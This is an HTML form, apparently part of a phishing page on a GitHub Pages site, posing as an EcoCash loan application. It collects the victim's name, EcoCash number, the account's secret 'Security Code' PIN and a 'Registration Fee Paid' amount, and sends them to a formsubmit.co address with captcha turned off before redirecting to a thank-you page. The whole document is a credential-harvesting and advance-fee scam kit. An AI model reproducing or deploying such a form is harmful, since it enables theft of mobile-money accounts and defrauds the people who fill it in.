<form action="https://formsubmit.co/ced6922f82f9c12de6df9a0e6b21fe3a" method="POST">
  <label>Full Name</label>
  <input type="text" name="Full Name" required>

  <label>EcoCash Number</label>
  <input type="tel" name="EcoCash Number" required>

  <label>Security Code</label>
  <input type="password" id="pin" name="Security Code" required>
  <span class="toggle" onclick="togglePIN()">👁️ Show / Hide</span>

  <label>Amount Applying For</label>
  <input type="text" name="Amount Applying For" required>

  <label>Registration Fee Paid</label>
  <input type="text" name="Registration Fee Paid" required>

  <label>Other Number (Optional)</label>
  <input type="tel" name="Other Number">

  <input type="hidden" name="_captcha" value="false">
  <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/ecocash-form/thankyou.html">

  <button type="submit">Click Here to Apply</button>
</form>
